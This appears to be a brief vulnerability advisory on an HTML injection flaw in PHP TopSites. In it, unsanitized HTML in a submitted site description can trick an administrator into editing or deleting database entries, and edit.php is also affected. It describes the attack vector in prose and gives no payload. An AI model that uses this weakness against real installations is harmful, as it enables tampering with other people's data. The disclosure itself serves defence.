An HTML injection vulnerability has been discovered in PHP TopSites. The issue occurs due to insufficient sanitization of user-supplied data. By injecting HTML code into the <body> tag of the description page, when submitting website, it may be possible to cause an administrator to edit or delete database entries.

This issue will occur when an unsuspecting administrator loads the submitted description.

This vulnerability has also been reported to affect the 'edit.php' script.
